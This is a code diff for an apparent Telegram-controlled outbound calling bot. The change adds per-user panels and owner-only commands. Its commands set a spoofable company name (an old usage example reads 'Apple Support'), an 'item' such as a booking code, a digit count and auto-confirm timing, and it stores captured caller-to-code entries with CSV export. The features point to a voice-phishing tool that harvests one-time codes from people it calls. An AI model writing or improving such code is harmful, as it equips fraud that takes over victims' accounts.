 Input Timeout: ${settings.inputTimeout}
 Auto Confirm: ${settings.autoConfirmSec}
 Auto Hangup: ${settings.autoHangupSec}
-Paused: ${settings.paused ? "Yes" : "No"}`);
+Paused: ${settings.paused ? "Yes" : "No"}
+Role: ${role}`
+        );
         return res.sendStatus(200);
       }
 
       if (text === "/logs") {
         let out = "📜 Logs\n\n";
-        db.logs.slice(0, 25).forEach(l => {
-          out += l + "\n";
-        });
-        await tgSend(out);
+        out += db.logs.length ? db.logs.slice(0, 25).join("\n") : "No logs";
+        await tgSend(chatId, out);
         return res.sendStatus(200);
       }
 
       if (text === "/history") {
         let out = "🗂 History\n\n";
-        db.history.slice(0, 30).forEach(l => {
-          out += l + "\n";
-        });
-        await tgSend(out);
+        out += db.history.length
+          ? db.history.slice(0, 30).join("\n")
+          : "No history";
+        await tgSend(chatId, out);
         return res.sendStatus(200);
       }
 
       if (text === "/stats") {
-        await tgSend(`📈 Stats
+        await tgSend(
+          chatId,
+          `📈 Stats
 
 Inbound: ${db.stats.inboundCalls}
 Outbound: ${db.stats.outboundCalls}
@@ -1172,42 +1299,55 @@ Hung Up: ${db.stats.hungUp}
 Auto Confirmed: ${db.stats.autoConfirmed}
 Auto Hung Up: ${db.stats.autoHungUp}
 Completed: ${db.stats.completedCalls}
-Scheduled: ${db.stats.scheduledCalls}`);
+Scheduled: ${db.stats.scheduledCalls}`
+        );
         return res.sendStatus(200);
       }
 
       if (text === "/codes") {
-        if (!db.codes.length) {
-          await tgSend("No saved entries.");
+        const ownCodes = db.codes.filter(
+          (c) => String(c.ownerId) === String(chatId)
+        );
+
+        if (!ownCodes.length) {
+          await tgSend(chatId, "No saved entries.");
         } else {
           let out = "🗂 Recent Entries\n\n";
-          db.codes.slice(0, 20).forEach(c => {
+          ownCodes.slice(0, 20).forEach((c) => {
             out += `${c.time}\n${c.caller} → ${c.value}\n\n`;
           });
-          await tgSend(out);
+          await tgSend(chatId, out);
         }
         return res.sendStatus(200);
       }
 
       if (text === "/clearcodes") {
+        if (!ownerOnly(chatId)) {
+          await tgSend(chatId, "Owner only");
+          return res.sendStatus(200);
+        }
         db.codes = [];
         saveDB();
-        await tgSend("Entries cleared");
+        await tgSend(chatId, "Entries cleared");
         return res.sendStatus(200);
       }
 
       if (text === "/export") {
+        if (!ownerOnly(chatId)) {
+          await tgSend(chatId, "Owner only");
+          return res.sendStatus(200);
+        }
         const csv = toCsv(db.codes);
-        await tgSendDocument("entries.csv", Buffer.from(csv, "utf8"));
+        await tgSendDocument(chatId, "entries.csv", Buffer.from(csv, "utf8"));
         return res.sendStatus(200);
       }
 
       if (text === "/profiles") {
         const names = Object.keys(db.profiles);
         if (!names.length) {
-          await tgSend("No saved profiles");
+          await tgSend(chatId, "No saved profiles");
         } else {
-          await tgSend("📁 Profiles\n\n" + names.join("\n"));
+          await tgSend(chatId, "📁 Profiles\n\n" + names.join("\n"));
         }
         return res.sendStatus(200);
       }
@@ -1216,7 +1356,7 @@ Scheduled: ${db.stats.scheduledCalls}`);
         const name = text.split(" ")[1];
 
         if (!name) {
-          await tgSend("Usage: /saveprofile name");
+          await tgSend(chatId, "Usage: /saveprofile name");
         } else {
           db.profiles[name] = {
             company: settings.company,
@@ -1225,11 +1365,10 @@ Scheduled: ${db.stats.scheduledCalls}`);
             itemName: settings.itemName
           };
           saveDB();
-          await tgSend(`✅ Profile saved: ${name}`);
-          markPanelDirty();
-          await updatePanel();
+          await tgSend(chatId, `✅ Profile saved: ${name}`);
+          markUserDirty(chatId);
+          await updatePanel(chatId);
         }
-
         return res.sendStatus(200);
       }
 
@@ -1237,7 +1376,7 @@ Scheduled: ${db.stats.scheduledCalls}`);
         const name = text.split(" ")[1];
 
         if (!name || !db.profiles[name]) {
-          await tgSend("Profile not found");
+          await tgSend(chatId, "Profile not found");
         } else {
           const p = db.profiles[name];
           settings.company = p.company;
@@ -1245,11 +1384,10 @@ Scheduled: ${db.stats.scheduledCalls}`);
           settings.assistant = p.assistant;
           settings.itemName = p.itemName;
           saveSettings();
-          await tgSend(`📁 Profile loaded: ${name}`);
-          markPanelDirty();
-          await updatePanel();
+          await tgSend(chatId, `📁 Profile loaded: ${name}`);
+          markUserDirty(chatId);
+          await updatePanel(chatId);
         }
-
         return res.sendStatus(200);
       }
 
@@ -1257,35 +1395,34 @@ Scheduled: ${db.stats.scheduledCalls}`);
         const name = text.split(" ")[1];
 
         if (!name || !db.profiles[name]) {
-          await tgSend("Profile not found");
+          await tgSend(chatId, "Profile not found");
         } else {
           delete db.profiles[name];
           saveDB();
-          await tgSend(`🗑 Profile deleted: ${name}`);
-          markPanelDirty();
-          await updatePanel();
+          await tgSend(chatId, `🗑 Profile deleted: ${name}`);
+          markUserDirty(chatId);
+          await updatePanel(chatId);
         }
-
         return res.sendStatus(200);
       }
 
       if (text.startsWith("/call ")) {
         const number = text.split(" ")[1];
         if (!number) {
-          await tgSend("Usage: /call +447xxxxxxxx");
+          await tgSend(chatId, "Usage: /call +447xxxxxxxx");
         } else {
-          await startCall(number);
-          await tgSend(`📞 Calling ${number}`);
+          await startCall(number, chatId);
+          await tgSend(chatId, `📞 Calling ${number}`);
         }
         return res.sendStatus(200);
       }
 
       if (text === "/calllast") {
-        if (!lastDialed) {
-          await tgSend("No previous outbound call");
+        if (!user.lastDialed) {
+          await tgSend(chatId, "No previous outbound call");
         } else {
-          await startCall(lastDialed);
-          await tgSend(`📞 Calling ${lastDialed}`);
+          await startCall(user.lastDialed, chatId);
+          await tgSend(chatId, `📞 Calling ${user.lastDialed}`);
         }
         return res.sendStatus(200);
       }
@@ -1295,11 +1432,11 @@ Scheduled: ${db.stats.scheduledCalls}`);
         if (d >= 2 && d <= 10) {
           settings.digits = d;
           saveSettings();
-          await tgSend(`✅ ${d} digits set`);
-          markPanelDirty();
-          await updatePanel();
+          await tgSend(chatId, `✅ ${d} digits set`);
+          markUserDirty(chatId);
+          await updatePanel(chatId);
         } else {
-          await tgSend("Use /digits 2 to 10");
+          await tgSend(chatId, "Use /digits 2 to 10");
         }
         return res.sendStatus(200);
       }
@@ -1309,11 +1446,11 @@ Scheduled: ${db.stats.scheduledCalls}`);
         if (a >= 1 && a <= assistants.length) {
           settings.assistant = a - 1;
           saveSettings();
-          await tgSend(`🎙 ${assistant().name} assistant set`);
-          markPanelDirty();
-          await updatePanel();
+          await tgSend(chatId, `🎙 ${assistant().name} assistant set`);
+          markUserDirty(chatId);
+          await updatePanel(chatId);
         } else {
-          await tgSend("Use /assistant 1 to 6");
+          await tgSend(chatId, `Use /assistant 1 to ${assistants.length}`);
         }
         return res.sendStatus(200);
       }
@@ -1321,13 +1458,13 @@ Scheduled: ${db.stats.scheduledCalls}`);
       if (text.startsWith("/company")) {
         const name = text.replace("/company", "").trim();
         if (!name) {
-          await tgSend("Usage: /company Apple Support");
+          await tgSend(chatId, "Usage: /company Support");
         } else {
           settings.company = name;
           saveSettings();
-          await tgSend(`🏢 Company set to ${settings.company}`);
-          markPanelDirty();
-          await updatePanel();
+          await tgSend(chatId, `🏢 Company set to ${settings.company}`);
+          markUserDirty(chatId);
+          await updatePanel(chatId);
         }
         return res.sendStatus(200);
       }
@@ -1335,13 +1472,13 @@ Scheduled: ${db.stats.scheduledCalls}`);
       if (text.startsWith("/item")) {
         const name = text.replace("/item", "").trim();
         if (!name) {
-          await tgSend("Usage: /item booking code");
+          await tgSend(chatId, "Usage: /item booking number");
         } else {
           settings.itemName = name;
           saveSettings();
-          await tgSend(`📝 Item set to ${settings.itemName}`);
-          markPanelDirty();
-          await updatePanel();
+          await tgSend(chatId, `📝 Item set to ${settings.itemName}`);
+          markUserDirty(chatId);
+          await updatePanel(chatId);
         }
         return res.sendStatus(200);
       }
@@ -1351,11 +1488,11 @@ Scheduled: ${db.stats.scheduledCalls}`);
         if (n >= 1 && n <= 10) {
           settings.maxRetries = n;
           saveSettings();
-          await tgSend(`🔁 Max retries set to ${n}`);
-          markPanelDirty();
-          await updatePanel();
+          await tgSend(chatId, `🔁 Max retries set to ${n}`);
+          markUserDirty(chatId);
+          await updatePanel(chatId);
         } else {
-          await tgSend("Usage: /maxretries 3");
+          await tgSend(chatId, "Usage: /maxretries 3");
         }
         return res.sendStatus(200);
       }
@@ -1365,11 +1502,11 @@ Scheduled: ${db.stats.scheduledCalls}`);
         if (n >= 3 && n <= 30) {
           settings.inputTimeout = n;
           saveSettings();
-          await tgSend(`⏱ Input timeout set to ${n}s`);
-          markPanelDirty();
-          await updatePanel();
+          await tgSend(chatId, `⏱ Input timeout set to ${n}s`);
+          markUserDirty(chatId);
+          await updatePanel(chatId);
         } else {
-          await tgSend("Usage: /timeout 8");
+          await tgSend(chatId, "Usage: /timeout 8");
         }
         return res.sendStatus(200);
       }
@@ -1379,11 +1516,11 @@ Scheduled: ${db.stats.scheduledCalls}`);
         if (n >= 0 && n <= 600) {
           settings.autoConfirmSec = n;
           saveSettings();
-          await tgSend(`✅ Auto confirm set to ${n}s`);
-          markPanelDirty();
-          await updatePanel();
+          await tgSend(chatId, `✅ Auto confirm set to ${n}s`);
+          markUserDirty(chatId);
+          await updatePanel(chatId);
         } else {
-          await tgSend("Usage: /autoconfirm 0");
+          await tgSend(chatId, "Usage: /autoconfirm 0");
         }
         return res.sendStatus(200);
       }
@@ -1393,35 +1530,50 @@ Scheduled: ${db.stats.scheduledCalls}`);
         if (n >= 0 && n <= 600) {
           settings.autoHangupSec = n;
           saveSettings();
-          await tgSend(`⛔ Auto hangup set to ${n}s`);
-          markPanelDirty();
-          await updatePanel();
+          await tgSend(chatId, `⛔ Auto hangup set to ${n}s`);
+          markUserDirty(chatId);
+          await updatePanel(chatId);
         } else {
-          await tgSend("Usage: /autohangup 0");
+          await tgSend(chatId, "Usage: /autohangup 0");
         }
         return res.sendStatus(200);
       }
 
       if (text === "/pause") {
+        if (!ownerOnly(chatId)) {
+          await tgSend(chatId, "Owner only");
+          return res.sendStatus(200);
+        }
         settings.paused = true;
         saveSettings();
-        await tgSend("⏸ Calling paused");
-        markPanelDirty();
-        await updatePanel();
+        await tgSend(chatId, "⏸ Calling paused");
+        markUserDirty(chatId);
+        await updatePanel(chatId);
         return res.sendStatus(200);
       }
 
       if (text === "/resume") {
+        if (!ownerOnly(chatId)) {
+          await tgSend(chatId, "Owner only");
+          return res.sendStatus(200);
+        }
         settings.paused = false;
         saveSettings();
-        await tgSend("▶ Calling resumed");
-        markPanelDirty();
-        await updatePanel();
+        await tgSend(chatId, "▶ Calling resumed");
+        markUserDirty(chatId);
+        await updatePanel(chatId);
         return res.sendStatus(200);
       }
 
       if (text === "/stop") {
-        const active = sortedCalls().filter(c => c.status !== "Ended");
+        if (!ownerOnly(chatId)) {
+          await tgSend(chatId, "Owner only");
+          return res.sendStatus(200);
+        }
+
+        const active = Array.from(calls.values()).filter(
+          (c) => c.status !== "Ended"
+        );
         for (const c of active) {
           try {
             await endLiveCallImmediately(c.sid);
@@ -1433,9 +1585,9 @@ Scheduled: ${db.stats.scheduledCalls}`);
 
         settings.paused = true;
         saveSettings();
-        await tgSend("🛑 All calls stopped and calling paused");
-        markPanelDirty();
-        await updatePanel();
+        await tgSend(chatId, "🛑 All calls stopped and calling paused");
+        markUserDirty(chatId);
+        await updatePanel(chatId);
         return res.sendStatus(200);
       }
 
@@ -1444,7 +1596,7 @@ Scheduled: ${db.stats.scheduledCalls}`);
         Object.entries(quickDialTargets).forEach(([label, number]) => {
           out += `${label}: ${number || "not set"}\n`;
         });
-        await tgSend(out);
+        await tgSend(chatId, out);
         return res.sendStatus(200);
       }
 
@@ -1454,14 +1606,14 @@ Scheduled: ${db.stats.scheduledCalls}`);
         const delayRaw = parts[2];
 
         if (!number || !delayRaw) {
-          await tgSend("Usage: /schedule +447xxxxxxxx 10m");
+          await tgSend(chatId, "Usage: /schedule +447xxxxxxxx 10m");
         } else {
           const delayMs = parseDelay(delayRaw);
           if (!delayMs) {
-            await tgSend("Use delay like 30s, 10m, 1h");
+            await tgSend(chatId, "Use delay like 30s, 10m, 1h");
           } else {
-            scheduleOutboundCall(number, delayMs);
-            await tgSend(`⏰ Scheduled ${number} in ${delayRaw}`);
+            scheduleOutboundCall(number, delayMs, chatId);
+            await tgSend(chatId, `⏰ Scheduled ${number} in ${delayRaw}`);
           }
         }
 
@@ -1479,13 +1631,20 @@ Scheduled: ${db.stats.scheduledCalls}`);
 // LIVE PANEL LOOP
 // ============================================================
 
-setInterval(() => {
-  if (panelDirty && panelMessageId) {
-    panelDirty = false;
-    updatePanel();
-  }
-  cleanupEndedCalls();
-}, 500);
+setInterval(async () => {
+  try {
+    const userIds = Object.keys(db.users);
+    for (const chatId of userIds) {
+      const user = ensureUser(chatId);
+      if (user.dirty && user.panelMessageId) {
+        user.dirty = false;
+        await updatePanel(chatId);
+      }
+    }
+    cleanupEndedCalls();
+    saveDB();
+  } catch {}
+}, 1000);
 
 // ============================================================
 // STARTUP
@@ -1496,9 +1655,12 @@ app.listen(PORT, async () => {
   console.log("Server booted and ready");
 
   try {
-    await new Promise(r => setTimeout(r, 3000));
-    await updatePanel(true);
-    console.log("Telegram panel created");
+    if (OWNER_ID) {
+      ensureUser(OWNER_ID);
+      await new Promise((r) => setTimeout(r, 2000));
+      await updatePanel(OWNER_ID, true);
+      console.log("Owner Telegram panel created");
+    }
   } catch (e) {
     console.log("Panel creation error:", e.message);
   }
